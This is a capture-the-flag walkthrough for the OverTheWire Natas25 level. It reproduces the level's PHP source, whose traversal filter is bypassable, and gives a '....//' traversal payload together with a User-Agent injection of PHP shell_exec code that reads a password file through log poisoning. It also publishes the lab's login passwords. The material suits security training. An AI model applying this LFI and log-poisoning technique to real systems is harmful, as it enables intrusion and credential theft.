# Natas25 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas25
Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
URL:      http://natas25.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- This lab with the quote is classic LFI.

  <img src=""/>

  ```
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
  <body>
  <?php
      // cheers and <3 to malvina
      // - morla
  
      function setLanguage(){
          /* language setup */
          if(array_key_exists("lang",$_REQUEST))
              if(safeinclude("language/" . $_REQUEST["lang"] ))
                  return 1;
          safeinclude("language/en"); 
      }
      
      function safeinclude($filename){
          // check for directory traversal
          if(strstr($filename,"../")){
              logRequest("Directory traversal attempt! fixing request.");
              $filename=str_replace("../","",$filename);
          }
          // dont let ppl steal our passwords
          if(strstr($filename,"natas_webpass")){
              logRequest("Illegal file access detected! Aborting!");
              exit(-1);
          }
          // add more checks...
  
          if (file_exists($filename)) { 
              include($filename);
              return 1;
          }
          return 0;
      }
      
      function listFiles($path){
          $listoffiles=array();
          if ($handle = opendir($path))
              while (false !== ($file = readdir($handle)))
                  if ($file != "." && $file != "..")
                      $listoffiles[]=$file;
          
          closedir($handle);
          return $listoffiles;
      } 
      
      function logRequest($message){
          $log="[". date("d.m.Y H::i:s",time()) ."]";
          $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
          $log=$log . " \"" . $message ."\"\n"; 
          $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
          fwrite($fd,$log);
          fclose($fd);
      }
  ?>
  
  <h1>natas25</h1>
  <div id="content">
  <div align="right">
  <form>
  <select name='lang' onchange='this.form.submit()'>
  <option>language</option>
  <?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
  </select>
  </form>
  </div>
  
  <?php  
      session_start();
      setLanguage();
      
      echo "<h2>$__GREETING</h2>";
      echo "<p align=\"justify\">$__MSG";
      echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
  ?>
  <p>
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

- Since inputs are not extremely sanitized, I found a vulnerable endpoint.

  <img src=""/>

- To read the password we will use this payload: `….//….//….//….//….//var/www/natas/natas25/logs/natas25_[PHPSESSID].log` and change the User-Agent in order to read the password: `<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>`

  <img src=""/>

---

## 🏁 Password for the next level

`Password for natas26 is: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
